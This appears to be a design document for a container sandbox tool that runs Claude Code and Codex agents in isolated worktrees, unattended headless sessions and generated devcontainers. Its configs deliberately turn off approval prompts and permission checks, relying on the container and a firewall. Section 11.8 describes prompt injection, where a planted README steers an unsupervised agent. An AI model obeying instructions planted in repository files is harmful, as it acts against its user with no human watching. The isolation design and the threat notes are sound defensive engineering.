# Generated by project-sandbox — container is the security boundary.
approval_policy  = "never"
sandbox_mode     = "danger-full-access"
disable_update_check = true

[sandbox_workspace_write]
network_access = true

[shell_environment_policy]
inherit = "core"
```

### 8.3 Jujutsu: written by the entrypoint at runtime from env vars

```toml
[user]
name  = "<PROJECT_SANDBOX_USER_NAME>"
email = "<PROJECT_SANDBOX_USER_EMAIL>"
```

---

## 9. Launcher script generation

`templates/run-agent.sh.j2`:

```sh
#!/usr/bin/env bash
# Generated by project-sandbox — do not hand-edit.
set -euo pipefail

GIT_NAME="$(git config --global user.name  2>/dev/null || echo '')"
GIT_EMAIL="$(git config --global user.email 2>/dev/null || echo '')"

exec container run \
  --rm -it \
  --memory {{ memory }} --cpus {{ cpus }} \
{% if firewall_enabled %}
  --cap-add NET_ADMIN --cap-add NET_RAW \
{% endif %}
  --workdir /workspace \
  --mount type=bind,source={{ project_abs }},target=/workspace \
  --mount type=bind,source={{ claude_settings_abs }},target=/home/agent/.claude/settings.json,readonly \
  --mount type=bind,source={{ codex_config_abs }},target=/home/agent/.codex/config.toml,readonly \
{% if claude_home_host_abs %}
  --mount type=bind,source={{ claude_home_host_abs }},target=/home/agent/.claude.host{{ ',readonly' if ro_creds else '' }} \
{% endif %}
{% if codex_home_host_abs %}
  --mount type=bind,source={{ codex_home_host_abs }},target=/home/agent/.codex.host{{ ',readonly' if ro_creds else '' }} \
{% endif %}
  --env PROJECT_SANDBOX_USER_NAME="${GIT_NAME}" \
  --env PROJECT_SANDBOX_USER_EMAIL="${GIT_EMAIL}" \
  --env GIT_AUTHOR_NAME="${GIT_NAME}"     --env GIT_AUTHOR_EMAIL="${GIT_EMAIL}" \
  --env GIT_COMMITTER_NAME="${GIT_NAME}"  --env GIT_COMMITTER_EMAIL="${GIT_EMAIL}" \
  --env CLAUDE_CONFIG_DIR=/home/agent/.claude \
  --env CODEX_HOME=/home/agent/.codex \
{% if not firewall_enabled %}
  --env PROJECT_SANDBOX_NO_FIREWALL=1 \
{% endif %}
{% for env in extra_envs %}
  --env {{ env }} \
{% endfor %}
  {{ image_tag }} \
  project-sandbox-run {{ agent }} "$@"
```

---

## 10. Worktree mode

### 10.1 Motivation and design

Running an AI coding agent directly against the main checkout of a repository is risky — the agent may write partial changes, leave the index dirty, or conflict with work already in progress. Git worktrees solve this cleanly: a worktree is a full, independent working directory linked to the same repository object store, checked out to a specific branch, with no interaction with the main checkout's index or `HEAD`. The agent works in the worktree; the main checkout stays untouched. When the session ends the developer reviews the branch and decides how to integrate it.

The worktree path, not the project root, is bind-mounted into the container as `/workspace`. This means the container cannot see or touch any other branches, the main `HEAD`, or the `.git/` directory (only the branch tip and index of the worktree branch are materialized). This is a tighter scope than mounting the full project.

### 10.2 Lifecycle: create → run → integrate → clean up

```
project-sandbox --branch feature/fix-auth --after-session ask ./myrepo python:3.12-slim
```

**Step 1 — Worktree setup (host-side, before container launch)**

`worktree.py` runs on the host before `container run`:

```python
# worktree.py
import subprocess
from pathlib import Path
from dataclasses import dataclass

@dataclass
class Worktree:
    path: Path
    branch: str
    created: bool   # True if we created the branch; False if it already existed

def setup(
    repo: Path,
    branch: str,
    base: str | None = None,
    worktree_dir: Path | None = None,
) -> Worktree:
    repo = repo.resolve()
    wt_root = worktree_dir or (repo.parent / f"{repo.name}-worktrees")
    wt_path = wt_root / branch.replace("/", "-")

    if wt_path.exists():
        # Reattach to an existing worktree (idempotent reuse)
        _git(repo, ["worktree", "prune"])  # clean stale refs first
        existing = _list_worktrees(repo)
        if str(wt_path) in existing:
            return Worktree(path=wt_path, branch=branch, created=False)

    # Does the branch exist?
    branches = _git(repo, ["branch", "--list", branch], capture=True)
    branch_exists = branch.strip() in branches

    if branch_exists:
        _git(repo, ["worktree", "add", str(wt_path), branch])
        return Worktree(path=wt_path, branch=branch, created=False)
    else:
        base_ref = base or "HEAD"
        _git(repo, ["worktree", "add", "-b", branch, str(wt_path), base_ref])
        return Worktree(path=wt_path, branch=branch, created=True)

def teardown(repo: Path, wt: Worktree, *, after: str) -> None:
    """after: 'merge' | 'rebase' | 'pr' | 'nothing' | 'ask'"""
    if after == "ask":
        after = _prompt_user(wt)

    if after == "merge":
        _git(repo, ["merge", "--no-ff", wt.branch,
                    "-m", f"Merge agent session: {wt.branch}"])
    elif after == "rebase":
        # Rebase the worktree branch onto current HEAD, then fast-forward merge
        _git(repo, ["rebase", "HEAD", wt.branch])
        _git(repo, ["merge", "--ff-only", wt.branch])
    elif after == "pr":
        _git(repo, ["push", "-u", "origin", wt.branch])
        subprocess.run(["gh", "pr", "create", "--head", wt.branch,
                        "--fill"], check=False)
    # "nothing" — leave the branch; worktree stays registered

    if after in ("merge", "rebase"):
        _git(repo, ["worktree", "remove", "--force", str(wt.path)])
        # Optionally delete the branch (ask user separately)

def _git(repo: Path, args: list[str], capture: bool = False):
    result = subprocess.run(
        ["git", "-C", str(repo)] + args,
        capture_output=capture, text=True, check=True
    )
    return result.stdout if capture else None

def _list_worktrees(repo: Path) -> list[str]:
    out = _git(repo, ["worktree", "list", "--porcelain"], capture=True)
    return [line.split()[-1] for line in out.splitlines() if line.startswith("worktree")]

def _prompt_user(wt: Worktree) -> str:
    print(f"\n  Agent session ended. Branch: {wt.branch}")
    print(f"  Worktree: {wt.path}")
    choices = {"m": "merge", "r": "rebase", "p": "pr", "n": "nothing"}
    while True:
        ans = input("  Integrate? [m]erge / [r]ebase / [p]r / [n]othing: ").strip().lower()
        if ans in choices:
            return choices[ans]
```

**Step 2 — Mount the worktree path instead of the project root**

`build_run_argv` receives `workspace_abs = wt.path.resolve()` when a worktree is active, and passes it as the bind-mount source for `/workspace`. The project root is **not** mounted at all — the container only sees the worktree branch. The sanitized agent configs still come from `<project>/.project-sandbox/` (mounted read-only as before), because those are agent configuration, not project code.

One subtlety: the worktree's `.git` entry is a *file* (not a directory) that contains a `gitdir:` pointer back to the main repo's `worktrees/<name>/` directory. This file is present at `<wt_path>/.git`. The agent can read it, which tells it the branch name — that's fine and expected. It cannot traverse the pointer to reach other branches because only `<wt_path>` is mounted, not the main repo's `.git/`.

**Step 3 — Integration after session ends**

The `teardown()` function runs on the host after `container run` exits. Integration modes:

| Mode | What happens |
|---|---|
| `merge` | `git merge --no-ff <branch>` into current HEAD of the main checkout |
| `rebase` | `git rebase HEAD <branch>`, then `git merge --ff-only <branch>` — linear history |
| `pr` | `git push -u origin <branch>` + `gh pr create --head <branch> --fill` |
| `nothing` | Branch stays; worktree is kept registered. Use `git worktree list` to see it. |

`ask` (default) prints the branch name and worktree path and prompts the developer interactively. In unsupervised mode (no TTY) `ask` is not valid — it must be set explicitly via `--after-session`.

### 10.3 Jujutsu worktree equivalent

If the project is a jj repo (detected by the presence of `.jj/` at the project root), the same isolation can be achieved with `jj workspace add`:

```python
def setup_jj(repo: Path, workspace: str, ...) -> Path:
    wt_path = wt_root / workspace
    subprocess.run(
        ["jj", "--repository", str(repo), "workspace", "add",
         "--name", workspace, str(wt_path)],
        check=True,
    )
    return wt_path
```

`jj workspace add` creates a new working-copy commit (an anonymous change) in its own directory. Integration is `jj rebase -d main` followed by either committing into the main workspace or abandoning the workspace with `jj workspace forget <name>`. Detection logic:

```python
def is_jj_repo(project: Path) -> bool:
    return (project / ".jj").is_dir()
```

The `--branch` flag maps to `--workspace-name` for jj repos; we use the same flag name for the user and translate internally. For v0.1, support for jj worktrees is implemented but documented as experimental; the teardown integration options are limited to `nothing` and `rebase` (jj's equivalent).

### 10.4 Branch naming and collision avoidance

If `--branch` is not specified but the user is running in worktree mode implicitly (a future `--worktree` flag without a branch name), auto-generate a branch name:

```python
import datetime, re, subprocess

def auto_branch_name(agent: str) -> str:
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M")
    return f"agent/{agent}/{ts}"
```

If the branch already exists as a registered worktree in this repo, refuse with a clear error and suggest `--worktree-dir` to place it elsewhere, or omit `--branch` to reuse the existing worktree.

### 10.5 Worktree edge cases

* **`apple/container` requires absolute paths.** `wt_path.resolve()` before passing to `build_run_argv` — same rule as the project path.
* **Worktree outside the project directory.** The default places worktrees in `<project>/../<name>-worktrees/`. This keeps them out of the project's own directory tree (preventing accidental `.gitignore` interactions) and out of any `container` volume context. Ensure the path doesn't collide with an existing directory.
* **Agent commits inside the worktree.** The container bind-mounts the worktree directory read-write. Any `git commit` the agent makes is committed to the worktree branch in the shared `.git/` object store — visible on the host immediately via `git log <branch>`. This is the intended behaviour.
* **Agent pushes.** If the firewall allowlist includes GitHub (it does by default), the agent can `git push` the worktree branch to the remote. This is intentional for the `pr` integration mode. If it is not desired, add `--after-session nothing` and document the remote-push risk.
* **Dirty worktree on container crash.** If the container is killed mid-session, the worktree branch may have uncommitted changes. The developer can inspect with `git -C <wt_path> status` and commit, stash, or discard as needed. We document this and do not attempt automated recovery.
* **Multiple concurrent worktrees.** Each `--branch` creates its own worktree path and a separate `container run` invocation. Concurrency is up to the developer; we do not serialize or coordinate. Resource contention on the shared `.git/` pack files is handled by git's own lock mechanisms.
* **jj worktree `@`-suffix semantics.** In jj, the workspace working-copy commit gets a `@<workspace-name>` suffix. This means `jj log` shows `main@` and `<workspace>@` as separate heads. Developers unfamiliar with jj's multi-workspace model should read the jj docs before using this mode.

---

## 11. Unsupervised session mode

### 11.1 Motivation

Interactive agent sessions require a human watching a TUI. For repetitive or batch tasks — "fix all the failing tests", "write docstrings for every public function", "apply this migration to all model files" — a human-in-the-loop is unnecessary overhead. Unsupervised mode removes the TTY, passes a starting prompt directly to the agent's stdin or CLI flag, tees all output to a log file, and exits cleanly when the agent session ends. Combined with worktree mode, this gives a pure fire-and-forget workflow: `project-sandbox --branch agent/fix-tests --prompt fix_tests.txt --after-session pr ./myrepo python:3.12-slim` creates a branch, runs the agent unattended, and opens a pull request when it's done.

### 11.2 How Claude Code and Codex accept prompts non-interactively

**Claude Code** accepts an initial prompt via:
- `claude -p "prompt text"` — single non-interactive turn, prints output, exits.
- `claude --print "prompt"` (alias for `-p`) — same.
- Stdin: `echo "prompt" | claude --print` — also works.
- For multi-turn headless use (agent continues until it decides to stop): `claude -p "prompt" --output-format stream-json` produces a stream of JSON events that can be logged. The agent exits when it reaches its natural stopping point.

The key flag for unsupervised use is `-p` / `--print`, which switches Claude Code out of interactive TUI mode into a single-pass print mode. **Do not pass `-p` without also removing `-it` from `container run`** — a non-TTY container with `-it` hangs.

**Codex** accepts a prompt as a positional argument: `codex exec "fix the failing tests"`. With `--approval-policy never` (which our config already sets), it runs non-interactively and exits on completion.

### 11.3 Mode detection and container run flags

The presence of `--prompt` or `--prompt-text` switches the session into unsupervised mode. This changes two things in `build_run_argv`:

1. **`-it` is replaced with `-i` (stdin pipe) or removed entirely.** With `-p`/`--print` Claude Code reads the prompt and exits — no stdin needed at all. We drop both `-i` and `-t` and pipe the prompt via `--env` or a mounted file (see below).
2. **`--log` output.** `container run` stdout/stderr is redirected to the log file on the host. The launcher script becomes:

```sh
container run \
  --rm \            # no -it
  ... \
  "${IMAGE}" project-sandbox-run claude-headless "${PROMPT_TEXT}" \
  2>&1 | tee "${LOG_FILE}"
```

### 11.4 Prompt delivery mechanism

Two approaches, chosen based on prompt size:

**Short prompts (≤ 4096 chars) — env var.** Pass the prompt text as `PROJECT_SANDBOX_PROMPT` env var. The entrypoint dispatch reads it:

```sh
claude-headless)
  shift
  exec claude -p "${PROJECT_SANDBOX_PROMPT:-${1:-}}" \
       --output-format stream-json \
       --dangerously-skip-permissions
  ;;
```

**Longer prompts / files — bind-mounted file.** The prompt file is mounted read-only at `/workspace/.project-sandbox-prompt` (inside the worktree mount, so it's visible but clearly labelled):

```python
if prompt_path:
    mounts.append(
        f"type=bind,source={prompt_path.resolve()},target=/workspace/.project-sandbox-prompt,readonly"
    )
    prompt_env = "PROJECT_SANDBOX_PROMPT_FILE=/workspace/.project-sandbox-prompt"
```

The entrypoint then:

```sh
claude-headless)
  shift
  if [ -n "${PROJECT_SANDBOX_PROMPT_FILE:-}" ]; then
    exec claude -p "$(cat "$PROJECT_SANDBOX_PROMPT_FILE")" \
         --output-format stream-json \
         --dangerously-skip-permissions
  else
    exec claude -p "${PROJECT_SANDBOX_PROMPT:-}" \
         --output-format stream-json \
         --dangerously-skip-permissions
  fi
  ;;
codex-headless)
  shift
  PROMPT="${PROJECT_SANDBOX_PROMPT:-$(cat "${PROJECT_SANDBOX_PROMPT_FILE:-/dev/null}")}"
  exec codex exec "$PROMPT"
  ;;
```

### 11.5 Log file management

The log file is written on the host (not inside the container) by redirecting `container run` stdout/stderr in the launcher script. Default path:

```python
def default_log_path(project: Path, branch: str | None, agent: str) -> Path:
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    stem = f"{agent}-{branch.replace('/', '-') if branch else 'main'}-{ts}"
    log_dir = project / ".project-sandbox" / "sessions"
    log_dir.mkdir(parents=True, exist_ok=True)
    return log_dir / f"{stem}.log"
```

Session logs are gitignored (added to `.project-sandbox/.gitignore` as `sessions/`). The launcher script in unsupervised mode:

```sh
#!/usr/bin/env bash
# Generated by project-sandbox — unsupervised session launcher.
set -euo pipefail
LOG="{{ log_path }}"
echo "Starting unsupervised {{ agent }} session. Log: $LOG"
container run \
  --rm \
  ... \
  "{{ image_tag }}" \
  project-sandbox-run {{ agent }}-headless \
  2>&1 | tee "$LOG"
EXIT_CODE="${PIPESTATUS[0]}"
echo "Session ended (exit $EXIT_CODE). Log: $LOG"
exit "$EXIT_CODE"
```

Note `PIPESTATUS[0]` (bash-specific) captures the container's exit code through the `tee` pipe, so a non-zero exit from the agent is propagated correctly for CI use.

### 11.6 Timeout handling

When `--timeout SECONDS` is specified, the launcher wraps `container run` with a timeout:

```sh
timeout --kill-after=30 {{ timeout }} \
  container run --rm ...
```

If the timeout fires, `timeout` sends `SIGTERM` to `container run`, which forwards it into the container and triggers a graceful shutdown. After 30 seconds `SIGKILL` is sent. The exit code from `timeout` is 124 on timeout, which is propagated through the log tee and surfaced to the caller.

For unsupervised worktree sessions, the worktree teardown (`--after-session`) still runs after the container exits, even on timeout — the agent may have committed partial work that the developer wants to inspect. Timeout is therefore never treated as a fatal error from the teardown perspective.

### 11.7 Combining worktree and unsupervised mode in `cli.py`

```python
def main(argv=None):
    args = build_parser().parse_args(argv)
    ...

    # Determine workspace (may be a worktree)
    worktree = None
    if args.branch:
        if is_jj_repo(project):
            workspace_path = worktree_mod.setup_jj(project, args.branch, ...)
        else:
            worktree = worktree_mod.setup(
                project, args.branch,
                base=args.worktree_base,
                worktree_dir=Path(args.worktree_dir) if args.worktree_dir else None,
            )
            workspace_path = worktree.path
    else:
        workspace_path = project

    # Determine session mode
    unsupervised = bool(args.prompt or args.prompt_text)
    prompt_path = Path(args.prompt).resolve() if args.prompt else None
    prompt_text = args.prompt_text or ""

    # Resolve log path
    log_path = (
        Path(args.log).resolve() if args.log
        else session.default_log_path(project, args.branch, args.agent)
    ) if unsupervised else None

    # Build and run the container
    if unsupervised:
        exit_code = session.run(
            image=tag,
            workspace=workspace_path,
            agent=args.agent,
            prompt_text=prompt_text,
            prompt_path=prompt_path,
            log_path=log_path,
            timeout=args.timeout,
            # ... all the usual mount/env/cap args
        )
    else:
        container_cli.run_interactive(
            image=tag,
            workspace=workspace_path,
            agent=args.agent,
            # ...
        )
        exit_code = 0

    # Post-session integration
    if worktree:
        after = args.after_session
        if unsupervised and after == "ask":
            # Can't ask in non-interactive mode; default to 'nothing' and warn
            print("WARNING: --after-session ask is not valid in unsupervised mode. Defaulting to 'nothing'.")
            after = "nothing"
        worktree_mod.teardown(project, worktree, after=after)

    return exit_code
```

### 11.8 Unsupervised mode edge cases

* **Claude Code `-p` vs interactive mode.** The `-p`/`--print` flag is mandatory; without it Claude Code opens its TUI and hangs waiting for a TTY. The entrypoint dispatch (`claude-headless` vs `claude`) enforces this separation.
* **Output format for logging.** `--output-format stream-json` produces newline-delimited JSON events (tool uses, text chunks, final result). This is machine-parseable for future analysis but verbose for human reading. The log file contains the raw stream. A future `project-sandbox logs --pretty <logfile>` subcommand can render it as readable text.
* **Agent exit codes.** Claude Code exits 0 on success, non-zero on error or if it cannot complete the task. Codex similarly. The launcher propagates the exit code. In CI, `project-sandbox` exits with the agent's exit code, so pipelines can detect failures.
* **Prompt injection in unsupervised mode.** An unsupervised agent running with `bypassPermissions` and no human oversight is the highest-risk posture. The firewall mitigates exfiltration; the worktree mitigates accidental damage to the main branch. But a maliciously crafted file in the worktree (e.g. a `README.md` with embedded instructions) can still steer the agent. Document this prominently. Mitigation: use narrow, specific prompts; inspect the diff before `--after-session merge/rebase/pr`.
* **Unsupervised sessions and the devcontainer.** Devcontainers are IDE-attached and inherently interactive; unsupervised mode doesn't apply to them. If someone tries to run `project-sandbox --prompt ... --devcontainer-only`, emit an error: `--prompt/--prompt-text are not compatible with --devcontainer-only`.
* **Concurrent unsupervised sessions.** Multiple `project-sandbox` invocations with different `--branch` values can run in parallel — each gets its own worktree, its own container VM, and its own log file. No coordination is needed. Document the API-rate-limit implications (multiple parallel Claude Code sessions will consume API quota faster).

---

## 12. Devcontainer generation

The tool writes a `.devcontainer/` tree at the project root that replicates the exact same sandbox — same image, same firewall, same sanitized agent configs, same identity wiring — for use with VS Code, Cursor, JetBrains Gateway, GitHub Codespaces, and any other devcontainer-compliant tooling (Docker Desktop, OrbStack, Podman, etc.).

### 12.1 What gets written

```
<project>/
└── .devcontainer/
    ├── devcontainer.json          # main spec (generated from template)
    ├── Dockerfile -> ../.project-sandbox/Dockerfile   # symlink — single source of truth
    ├── init-firewall.sh -> ../.project-sandbox/init-firewall.sh  # symlink
    └── claude/
        └── settings.json -> ../../.project-sandbox/claude/settings.json  # symlink
    └── codex/
        └── config.toml -> ../../.project-sandbox/codex/config.toml  # symlink
```

The Dockerfile and `init-firewall.sh` are **symlinked**, not copied, so `project-sandbox --rebuild` regenerates them once and both the launcher and the devcontainer automatically pick up the change. On filesystems where symlinks in `.devcontainer/` don't work (rare edge case with some Windows devcontainer clients), `devcontainer.py` falls back to writing relative `../` `build.context` and `dockerfilePath` in `devcontainer.json` to point into `.project-sandbox/` instead.

### 12.2 `templates/devcontainer.json.j2`

This template models Anthropic's reference `devcontainer.json` closely, substituting our image name, user, paths, and adding the `customizations` block for agent-relevant extensions.

```json
{
  "name": "{{ project_name }} (project-sandbox)",
  "build": {
    "dockerfile": "../.project-sandbox/Dockerfile",
    "context": "../.project-sandbox",
    "args": {
      "INSTALL_CLAUDE": "{% if install_claude %}1{% else %}0{% endif %}",
      "INSTALL_CODEX":  "{% if install_codex %}1{% else %}0{% endif %}"
    }
  },

  "runArgs": [
    "--cap-add=NET_ADMIN",
    "--cap-add=NET_RAW"{% if memory %},
    "--memory={{ memory }}"{% endif %}{% if cpus %},
    "--cpus={{ cpus }}"{% endif %}
  ],

  "workspaceMount": "source=${localWorkspaceFolder},target=/workspace,type=bind,consistency=delegated",
  "workspaceFolder": "/workspace",

  "remoteUser": "agent",

  "containerEnv": {
    "CLAUDE_CONFIG_DIR": "/home/agent/.claude",
    "CODEX_HOME":        "/home/agent/.codex",
    "NODE_OPTIONS":      "--max-old-space-size=4096"
  },

  "mounts": [
    "source=${localWorkspaceFolder}/.project-sandbox/claude/settings.json,target=/home/agent/.claude/settings.json,type=bind,readonly",
    "source=${localWorkspaceFolder}/.project-sandbox/codex/config.toml,target=/home/agent/.codex/config.toml,type=bind,readonly"{% if mount_claude_host %},
    "source=${localEnv:HOME}/.claude,target=/home/agent/.claude.host,type=bind{% if ro_creds %},readonly{% endif %}"{% endif %}{% if mount_codex_host %},
    "source=${localEnv:HOME}/.codex,target=/home/agent/.codex.host,type=bind{% if ro_creds %},readonly{% endif %}"{% endif %}{% for m in extra_mounts %},
    "{{ m }}"{% endfor %}
  ],

  "postStartCommand": "sudo /usr/local/bin/project-sandbox-init-firewall && /usr/local/bin/project-sandbox-devcontainer-init",
  "waitFor": "postStartCommand",

  "customizations": {
    "vscode": {
      "extensions": [
        "anthropic.claude-code"{% if install_codex %},
        "openai.codex-vscode"{% endif %}
      ],
      "settings": {
        "terminal.integrated.defaultProfile.linux": "bash"
      }
    }
  },

  "features": {}
}
```

Key design choices and their rationale:

**`build.dockerfile` + `build.context` point into `.project-sandbox/`.** The single Dockerfile is used for both `container build` (the apple/container launcher path) and `docker build` (the devcontainer path). No duplication.

**`runArgs` carries `--cap-add`.** This is how devcontainers grant Linux capabilities — there is no first-class `capAdd` key in the spec; `runArgs` is the documented pattern (same as Anthropic's reference, which uses `--cap-add=NET_ADMIN` and `--cap-add=NET_RAW` in `runArgs`).

**`mounts` bind the sanitized configs read-only** into the same target paths as the launcher, so the agent sees identical settings regardless of which entrypoint is used.

**`~/.claude` and `~/.codex` mounted to `*.host` paths.** Identical to the launcher mount strategy: the devcontainer entrypoint init script (`project-sandbox-devcontainer-init`) copies the credential files into place, the same way the `apple/container` entrypoint does.

**`postStartCommand` runs the firewall *then* the init script.** The `waitFor: postStartCommand` directive ensures the IDE doesn't open a terminal until the firewall is up and credentials are wired — mirroring the Anthropic reference exactly.

**No `ghcr.io/anthropics/devcontainer-features/claude-code` feature.** We deliberately omit this feature because (a) it installs its own `init-firewall.sh` that would silently overwrite ours (issue #32113), and (b) it installs Claude Code at an unpinned version, whereas our Dockerfile already pins it.

### 12.3 `project-sandbox-devcontainer-init` — the devcontainer-specific init script

The devcontainer startup needs to do the credential handover and identity wiring steps that the `apple/container` entrypoint does, but it runs as a `postStartCommand` (not as PID 1). We add a small script baked into the image for this:

```sh
#!/bin/sh
# /usr/local/bin/project-sandbox-devcontainer-init
# Runs after the firewall is up, as the remoteUser (agent).
set -eu

# Identity — read from env vars set by devcontainer.json containerEnv,
# falling back to git config if the IDE forwarded host env vars.
NAME="${PROJECT_SANDBOX_USER_NAME:-$(git config --global user.name 2>/dev/null || echo '')}"
EMAIL="${PROJECT_SANDBOX_USER_EMAIL:-$(git config --global user.email 2>/dev/null || echo '')}"

if [ -n "$NAME" ] || [ -n "$EMAIL" ]; then
  : > "$HOME/.gitconfig"
  [ -n "$NAME"  ] && git config --global user.name  "$NAME"
  [ -n "$EMAIL" ] && git config --global user.email "$EMAIL"
  mkdir -p "$HOME/.config/jj"
  cat > "$HOME/.config/jj/config.toml" <<EOF
[user]
name  = "${NAME}"
email = "${EMAIL}"
EOF
fi

# Credential handover (same logic as container entrypoint)
mkdir -p "$HOME/.claude" "$HOME/.codex"
if [ -f "$HOME/.claude.host/.credentials.json" ]; then
  cp "$HOME/.claude.host/.credentials.json" "$HOME/.claude/.credentials.json"
  chmod 600 "$HOME/.claude/.credentials.json"
fi
if [ -f "$HOME/.codex.host/auth.json" ]; then
  cp "$HOME/.codex.host/auth.json" "$HOME/.codex/auth.json"
  chmod 600 "$HOME/.codex/auth.json"
fi

echo "project-sandbox: devcontainer init complete."
```

This script is added to the Dockerfile (alongside the firewall script) with similar permissions but **no sudoers entry** — it runs as `agent` already:

```dockerfile
COPY project-sandbox-devcontainer-init /usr/local/bin/
RUN chmod 0755 /usr/local/bin/project-sandbox-devcontainer-init
```

### 12.4 Identity forwarding into the devcontainer

The devcontainer spec provides several ways to inject git identity. We use **`remoteEnv`** in `devcontainer.json` to forward the host git values at container-start time, resolving them on the host side via the `localEnv` variable syntax:

```json
"remoteEnv": {
  "PROJECT_SANDBOX_USER_NAME":  "${localEnv:GIT_AUTHOR_NAME}",
  "PROJECT_SANDBOX_USER_EMAIL": "${localEnv:GIT_AUTHOR_EMAIL}"
}
```

The `devcontainer.json` generator reads the host git identity at generation time and also writes it as a `remoteEnv` fallback so the init script picks it up even on hosts where `GIT_AUTHOR_NAME` isn't exported as an environment variable. The fallback chain in `project-sandbox-devcontainer-init` is: `PROJECT_SANDBOX_USER_NAME` env var → `git config --global user.name` inside the container (which would be empty on a fresh container) → empty string (warn, don't abort).

For VS Code specifically, the `dotfiles` feature or `initializeCommand` can be used to export git config vars before the container starts, but that's opt-in. Our defaults work without any host configuration beyond having git configured.

### 12.5 `devcontainer.py` module

```python
# devcontainer.py
import json
from pathlib import Path
from jinja2 import Environment, PackageLoader
from .git_identity import GitIdentity

def render(
    project: Path,
    *,
    image_tag: str,
    identity: GitIdentity,
    install_claude: bool,
    install_codex: bool,
    firewall_enabled: bool,
    memory: str | None,
    cpus: int | None,
    ro_creds: bool,
    extra_mounts: list[str],
    extra_domains: list[str],
    allow_openai: bool,
    refresh: bool = False,
) -> Path:
    dc_dir = project / ".devcontainer"
    dc_dir.mkdir(exist_ok=True)

    ps_dir = project / ".project-sandbox"

    # Symlink Dockerfile and init-firewall.sh (relative symlinks for portability)
    _symlink(dc_dir / "Dockerfile",       Path("../.project-sandbox/Dockerfile"))
    _symlink(dc_dir / "init-firewall.sh", Path("../.project-sandbox/init-firewall.sh"))

    # Write devcontainer.json
    out = dc_dir / "devcontainer.json"
    if out.exists() and not refresh:
        return dc_dir

    env = Environment(loader=PackageLoader("project_sandbox", "templates"))
    tmpl = env.get_template("devcontainer.json.j2")
    out.write_text(tmpl.render(
        project_name=project.name,
        install_claude=install_claude,
        install_codex=install_codex,
        memory=memory,
        cpus=cpus,
        ro_creds=ro_creds,
        mount_claude_host=(project.parent / ".claude").exists() or
                          Path.home().joinpath(".claude").exists(),
        mount_codex_host=(project.parent / ".codex").exists() or
                         Path.home().joinpath(".codex").exists(),
        extra_mounts=extra_mounts,
        user_name=identity.name or "",
        user_email=identity.email or "",
    ) + "\n")
    return dc_dir

def _symlink(link: Path, target: Path) -> None:
    """Create relative symlink; skip if already correct."""
    if link.exists() or link.is_symlink():
        if link.resolve() == (link.parent / target).resolve():
            return
        link.unlink()
    link.symlink_to(target)
```

### 12.6 Updating `cli.py` main flow

```python
# After launcher.render():
if not args.no_devcontainer:
    devcontainer.render(
        project,
        image_tag=tag,
        identity=identity,
        install_claude=args.agent in ("claude", "both"),
        install_codex=args.agent in ("codex", "both"),
        firewall_enabled=not args.no_firewall,
        memory=args.memory,
        cpus=args.cpus,
        ro_creds=args.credentials_mode == "ro",
        extra_mounts=args.extra_mounts,
        extra_domains=args.extra_domain,
        allow_openai=args.firewall_allow_openai or args.agent in ("codex", "both"),
        refresh=args.refresh_config,
    )
    print(f"\n  Devcontainer written to {project / '.devcontainer'}/")
    print(f"  Open the project in VS Code and choose 'Reopen in Container'.")
```

### 12.7 `.gitignore` considerations

The tool appends (idempotently) to `<project>/.gitignore`:

```gitignore
# project-sandbox — do not commit agent secrets
.project-sandbox/claude/.credentials.json
.project-sandbox/codex/auth.json
```

The `.devcontainer/` directory itself **should** be committed — that's the point of generating it. The Dockerfile symlink, `devcontainer.json`, and `init-firewall.sh` symlink are all checked in so the team gets a consistent dev environment from `git clone`.

The sanitized `settings.json` and `config.toml` under `.project-sandbox/claude/` and `.project-sandbox/codex/` are also safe to commit (they contain no secrets, only the "bypass permissions" defaults). We add a `.project-sandbox/.gitignore` that excludes the Dockerfile build context scratch files but includes the config files:

```gitignore
# .project-sandbox/.gitignore
*             # exclude everything by default...
!claude/
!claude/settings.json
!codex/
!codex/config.toml
!init-firewall.sh
```

### 12.8 Devcontainer edge cases

* **Symlinks in `.devcontainer/` on Windows hosts.** Docker Desktop on Windows sometimes fails to resolve relative symlinks in the build context. Detect at generation time via `--platform win32` (not currently needed for our macOS-only tool, but worth a note). Fallback: write `"dockerfilePath": "../.project-sandbox/Dockerfile"` directly in `devcontainer.json` and omit the symlink.

* **`runArgs` vs `hostRequirements.cpus`/`memory`.** The `runArgs` `--memory` and `--cpus` values apply when using Docker Desktop; GitHub Codespaces ignores them and uses its own machine type. Add a `hostRequirements` block to `devcontainer.json` as a hint:

  ```json
  "hostRequirements": {
    "cpus": {{ cpus }},
    "memory": "{{ memory }}gb"
  }
  ```

* **Codespaces and `NET_ADMIN`.** GitHub Codespaces runs on privileged containers by default; `NET_ADMIN` and `NET_RAW` work. Codespaces does not require `runArgs` for this — `securityOpt` or the privileged flag handles it. Our `runArgs` approach is still correct and Codespaces respects it.

* **`devcontainer.json` `waitFor: postStartCommand` timing.** If `project-sandbox-init-firewall` is slow (GitHub meta API resolution), the IDE terminal will appear delayed. This is intentional and correct — don't skip `waitFor`.

* **The `anthropic.claude-code` VS Code extension ID.** Verify this is the current published extension ID; as of May 2026 the Claude Code VS Code extension is listed under this ID. If the extension ID changes, update the `customizations.vscode.extensions` list in the template.

* **OrbStack + devcontainer.** OrbStack implements the Docker socket protocol; devcontainers work identically to Docker Desktop. Our `runArgs` capabilities work as expected.

---

## 13. Edge cases and known issues

### 13.1 Apple container–specific

* **Absolute paths only for `--mount` sources.** Enforced by `paths.resolve_strict()` everywhere. The relative-path bug is [#565](https://github.com/apple/container/issues/565).
* **`container system start` must be running.** Called idempotently at startup.
* **Builder VM is separate from run VMs.** If `container build` OOMs, surface a hint: `container builder start --memory 8g --cpus 8`.
* **virtiofs UID semantics.** Entrypoint runs `chown -R agent:agent` on credential dirs to fix up host-UID ownership from virtiofs.
* **Anonymous volumes don't auto-clean with `--rm`.** We use only bind mounts.
* **`--env-file` had bugs** ([#303](https://github.com/apple/container/issues/303)); we use repeated `--env KEY=VALUE` only.
* **Env vars logged to `vminitd.log`** ([discussion #1153](https://github.com/apple/container/discussions/1153)). We pass identity via `--env` (low sensitivity) and tokens via mounted credential files only.

### 13.2 Firewall-specific

* **`NET_ADMIN` / `NET_RAW` required.** Without these caps `iptables` fails. We pass `--cap-add` in the launcher; document this as a requirement.
* **Duplicate IP handling.** We use `ipset add --exist` throughout. The upstream `ipset add` is the root cause of issue #35197 / #15611 which crashes container startup.
* **DNS tunneling defense.** Upstream allows DNS to any server; we restrict to the detected resolver (`/etc/resolv.conf` nameserver). See issue #36907.
